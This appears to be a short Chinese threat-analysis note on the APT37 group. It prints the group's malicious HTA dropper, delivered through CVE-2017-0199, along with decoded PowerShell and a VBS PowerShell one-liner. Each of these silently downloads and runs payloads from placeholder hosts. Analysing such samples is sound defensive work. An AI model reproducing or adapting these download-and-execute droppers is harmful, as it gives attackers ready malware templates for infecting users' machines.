# APT37

## 特征

1. 使用Microsoft Office漏洞（CVE-2017-0199）下载并执行恶意HTA文件.

```hta
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type" />

<title>Bonjour</title>
<script language="VBScript">
Set owFrClN0giJ = CreateObject("Wscript.Shell")
Set v1ymUkaljYF = CreateObject("Scripting.FileSystemObject")
If v1ymUkaljYF.FileExists(owFrClN0giJ.ExpandEnvironmentStrings("%PSModulePath%") + "..\powershell.exe") Then
owFrClN0giJ.Run "powershell -nop -windowstyle hidden -executionpolicy bypass -encodedcommand Base64加密命令" ,0
owFrClN0giJ.Run "cmd /c echo hta>%tmp%\webbrowser1094826604.tmp", 0
End If
Self.Close
</script>
<hta:application
id="oHTA"
applicationname="Bonjour"
application="yes"
>
</head>
</html>
```

其中Base64加密的命令解密后会下载执行一个Windows脚本和两个恶意文件.

```hta
$c=new-object System.Net.WebClient
$t =$env:temp
$t1=$t+"\\alitmp0131.jpg"
$t2=$t+"\\alitmp0132.jpg"
$t3=$t+"\\alitmp0133.js"

try
  {
    echo $c.DownloadFile( "http://域名/btob_asiana/appach01.jpg",$t1)
    $c.DownloadFile( "http://域名/btob_asiana/appach02.jpg",$t2)
    $c.DownloadFile( "http://域名/btob_asiana/udel_ok.ipp",$t3)
    wscript.exe $t3
  }
catch
  {
  }
```

2. 通过VBS投递恶意软件时会使用反混淆的PowerShell命令下载多个恶意文件.

```powershell
objShell.Run "cmd.exe /k powershell.exe" & " " & "-windowstyle" & " " & "hidden" & " " & "-ExecutionPolicy Bypass" & " " & "$h='%APPDATA%/Microsoft/Windows/msvcrt32.dll'" & ";" & "$f='%APPDATA%/Microsoft/ieConv.exe'" & ";" & "$x='" & "http://" & "Url地址" & "/UserFiles/File/image/images/happy.jpg" & "';" & "$t='" & "http://" & "Url地址" & "/UserFiles/File/image/images/wwwtest.jpg" & "';" & "(" & "New-Object System.Net.WebClient" & ")" & ".DownloadFile($t,$f)" & ";" & "(" & "New-Object System.Net.WebClient" & ")" & ".DownloadFile($x,$h)" & ";" & "Start-Process $f" & ";" & "Stop-Process" & " " & "-processname" & " " & "cmd", 0
```
